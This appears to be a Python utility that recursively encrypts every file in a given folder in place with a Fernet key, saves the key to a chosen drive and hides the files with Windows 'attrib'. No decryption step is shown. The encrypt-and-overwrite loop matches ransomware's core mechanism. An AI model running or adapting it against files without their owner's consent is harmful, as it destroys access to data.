#!/usr/bin/env python3

import os
import subprocess
import stat
import sys
from cryptography.fernet import Fernet

#-----------------------variables------------------------------
# Extract folder path and drive name from command line arguments
if len(sys.argv) < 3:
    print("less arguments")
    sys.exit(1)

path = sys.argv[1]
drive_name = sys.argv[2]
key = Fernet.generate_key()
# Construct the path for the key file
key_file_path = f'{drive_name}:\\thekey.key'
#-----------------------functions------------------------------

#function to get all the files in a given folder
def list_files(directory):
    file_list = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_list.append(os.path.join(root, file))
    return file_list

def hide_files(directory):
    # Hide individual files within the directory
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            hide_single_file(file_path)

def hide_single_file(file_path):
    # Add the hidden attribute to the file
    if not os.path.basename(file_path).startswith('.'):  # Exclude hidden files and directories
        try:
            # Execute the command to hide the file using the command prompt
            subprocess.run(['attrib', '+h',file_path], shell=True)
            print("hided ",file_path)
        except:
            pass

#---------------------------------------------------------------------
files=list_files(path)

with open(key_file_path, "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file,"rb") as thefile:
        contents=thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_encrypted)
hide_files(path)
print("encrypted")
